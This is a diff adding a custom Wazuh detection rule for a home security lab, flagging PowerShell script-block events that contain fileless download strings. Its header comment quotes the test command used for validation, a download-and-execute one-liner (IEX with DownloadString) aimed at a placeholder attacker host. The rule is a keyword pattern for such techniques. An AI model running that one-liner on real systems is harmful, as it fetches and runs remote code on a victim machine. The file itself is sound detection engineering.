@@ -1,0 +1,60 @@
+<!--
+  Detection : Suspicious PowerShell Execution (fileless download pattern)
+  Lab       : soc-home-lab (Wazuh 4.9.2, Win10 Target + Sysmon + PowerShell Script Block Logging)
+  Install   : /var/ossec/etc/rules/local_rules.xml
+              then: systemctl restart wazuh-manager
+  Rule ID   : 100002 (custom range 100000+)
+
+  Description:
+    100002  Fires when a PowerShell Script Block Logging event (Event ID
+            4104, matched via built-in rule 91837) contains one of several
+            strings commonly seen in fileless download / execution
+            patterns: DownloadString, EncodedCommand, FromBase64String,
+            or Invoke-Expression. Level 12.
+
+  MITRE ATT&CK:
+    T1059.001  Command and Scripting Interpreter: PowerShell
+
+  Why build on rule 91837:
+    The built-in rule 91837 already flags "Get-Content -Stream or
+    Invoke-Expresion" patterns at level 4 — useful but low-severity and
+    generic. This custom rule re-checks the same scriptBlockText field for
+    a tighter set of strings associated with fileless payload delivery and
+    raises the severity to level 12, since these specific patterns are a
+    stronger signal than the built-in rule's broader match alone.
+
+  Validated against a real run:
+    - Command executed on the target: a one-liner using
+      IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>/test.ps1')
+      both directly and wrapped in powershell.exe -Command.
+    - The remote .ps1 file did not exist / no HTTP server was listening on
+      the attacker host, so the DownloadString call failed with a
+      WebException ("Невозможно соединиться с удаленным сервером") and no
+      remote payload was ever retrieved or executed.
+    - PowerShell Script Block Logging (Event 4104) still logged the full
+      command text before execution was attempted, so detection did not
+      depend on the download succeeding.
+    - Custom rule 100002 fired once during the test (confirmed in the
+      alert JSON, firedtimes: 1).
+
+  Investigation: ../investigations/powershell-execution.md
+
+  Future work:
+    - Chain this with a follow-up rule for actual outbound HTTP/HTTPS
+      connections from powershell.exe (correlating with Sysmon Event 3)
+      to distinguish a logged-but-failed attempt from one that reached
+      a live attacker server.
+-->
+<group name="windows,powershell,execution,custom,">
+
+  <rule id="100002" level="12">
+    <if_sid>91837</if_sid>
+    <field name="win.eventdata.scriptBlockText">DownloadString|EncodedCommand|FromBase64String|Invoke-Expression</field>
+    <description>Custom: Suspicious PowerShell Execution Detected (MITRE T1059.001)</description>
+    <mitre>
+      <id>T1059.001</id>
+    </mitre>
+    <group>execution,</group>
+  </rule>
+
+</group>
